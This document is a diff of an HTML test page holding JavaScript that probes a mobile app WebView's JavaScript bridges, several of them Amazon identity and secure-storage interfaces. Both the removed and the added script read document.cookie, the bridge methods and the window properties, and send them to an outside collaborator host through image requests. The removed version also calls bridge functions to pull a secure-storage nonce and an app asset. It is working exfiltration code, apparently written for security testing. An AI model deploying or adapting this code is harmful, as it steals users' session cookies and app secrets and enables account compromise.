@@ -1,86 +1,90 @@
 <!DOCTYPE html>
 <html>
-<head><title>Amazon App Bridge Test</title></head>
+<head><title>Enhanced JS Bridge Discovery</title></head>
 <body>
 <script>
-// Enumerate available JS bridges
-var bridges = [
-  'NativeInterface', 'AndroidInterface', 'smash', 'JSISecureStorage',
-  'ReactNativeWebView', 'APPToBrowserSSOJSBridge', 'MAPAndroidJSBridge',
-  'IDENTITY_MOBILE', 'FidoAuthenticatorJSBridge', 'IDENTITY_MOBILE_NAVIGATION',
-  'IDENTITY_MOBILE_PHONE_NUMBER_PICKER', 'IDENTITY_MOBILE_PASSKEY'
+// Comprehensive bridge discovery
+var results = {
+  url: window.location.href,
+  userAgent: navigator.userAgent,
+  cookies: document.cookie || 'none',
+  interfaces: [],
+  androidInterfaces: [],
+  allWindowProps: []
+};
+
+// Check for Android-specific interfaces
+var androidTests = [
+  'Android', 'AndroidInterface', 'NativeInterface', 'JSISecureStorage',
+  'smash', 'ReactNativeWebView', 'APPToBrowserSSOJSBridge', 
+  'MAPAndroidJSBridge', 'IDENTITY_MOBILE', 'FidoAuthenticatorJSBridge',
+  'IDENTITY_MOBILE_NAVIGATION', 'IDENTITY_MOBILE_PHONE_NUMBER_PICKER', 
+  'IDENTITY_MOBILE_PASSKEY', 'IDENTITY_MOBILE_DIGITAL_ID', 'IDENTITY_MOBILE_WHATSAPP',
+  'AndroidJavaScriptBridge', 'MAPAndroidJSBridge', 'FidoAuthenticatorJSBridge'
 ];
 
-var available = [];
-for(var i = 0; i < bridges.length; i++) {
-  if(window[bridges[i]]) {
-    available.push(bridges[i]);
+androidTests.forEach(function(name) {
+  if (window[name]) {
+    var methods = [];
+    try {
+      for (var prop in window[name]) {
+        if (typeof window[name][prop] === 'function') {
+          methods.push(prop);
+        }
+      }
+    } catch(e) {}
+    results.androidInterfaces.push({name: name, methods: methods});
+  }
+});
+
+// Enumerate ALL window properties containing 'Interface', 'Bridge', or 'JS'
+for (var prop in window) {
+  if (prop.toLowerCase().includes('interface') || 
+      prop.toLowerCase().includes('bridge') ||
+      prop.toLowerCase().includes('js') ||
+      prop.toLowerCase().includes('android') ||
+      typeof window[prop] === 'object' && window[prop] !== null) {
+    
+    var info = {name: prop, type: typeof window[prop]};
+    if (typeof window[prop] === 'object' && window[prop] !== null) {
+      try {
+        var methods = [];
+        for (var method in window[prop]) {
+          if (typeof window[prop][method] === 'function') {
+            methods.push(method);
+          }
+        }
+        info.methods = methods.slice(0, 10); // First 10 methods
+      } catch(e) {
+        info.error = e.toString();
+      }
+    }
+    results.allWindowProps.push(info);
   }
 }
 
-// Exfiltrate via GET request (no CORS preflight)
+// Check if WebView has special properties
+if (window.webkit) results.webkit = 'present';
+if (window.chrome) results.chrome = 'present';
+if (window.external) results.external = 'present';
+
+// Send results
 var img = new Image();
-img.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/bridges_found?data=' + 
-           encodeURIComponent(JSON.stringify({bridges: available, userAgent: navigator.userAgent}));
+img.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/comprehensive_scan?data=' + 
+          encodeURIComponent(JSON.stringify(results));
 
-// Test each bridge
-if(window.NativeInterface) {
+// Test if we can access any global functions that might be bridges
+setTimeout(function() {
+  var globalFuncs = [];
+  for (var prop in window) {
+    if (typeof window[prop] === 'function' && prop.length > 3) {
+      globalFuncs.push(prop);
+    }
+  }
   var img2 = new Image();
-  img2.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/native_interface_available';
-  
-  try {
-    var result = NativeInterface.triggerJSEvent('{"useCase":"test","action":"probe"}');
-    var img3 = new Image();
-    img3.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/native_interface_result?data=' + 
-               encodeURIComponent(JSON.stringify(result));
-  } catch(e) {
-    var img4 = new Image();
-    img4.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/native_interface_error?error=' + 
-               encodeURIComponent(e.toString());
-  }
-}
-
-if(window.smash) {
-  var img5 = new Image();
-  img5.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/smash_available';
-  
-  try {
-    var asset = smash.asset('config.json');
-    var img6 = new Image();
-    img6.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/smash_asset?data=' + 
-               encodeURIComponent(asset.substring(0,1000));
-  } catch(e) {
-    var img7 = new Image();
-    img7.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/smash_error?error=' + 
-               encodeURIComponent(e.toString());
-  }
-}
-
-if(window.JSISecureStorage) {
-  var img8 = new Image();
-  img8.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/jsi_available';
-  
-  try {
-    var nonce = JSISecureStorage.getNonce();
-    var img9 = new Image();
-    img9.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/jsi_nonce?data=' + 
-               encodeURIComponent(nonce);
-  } catch(e) {
-    var img10 = new Image();
-    img10.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/jsi_error?error=' + 
-                encodeURIComponent(e.toString());
-  }
-}
-
-// Check for cookies
-if(document.cookie) {
-  var img11 = new Image();
-  img11.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/cookies?data=' + 
-              encodeURIComponent(document.cookie);
-} else {
-  var img12 = new Image();
-  img12.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/no_cookies';
-}
+  img2.src = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com/global_functions?data=' + 
+             encodeURIComponent(JSON.stringify(globalFuncs.slice(0, 20)));
+}, 1000);
 </script>
 </body>
 </html>
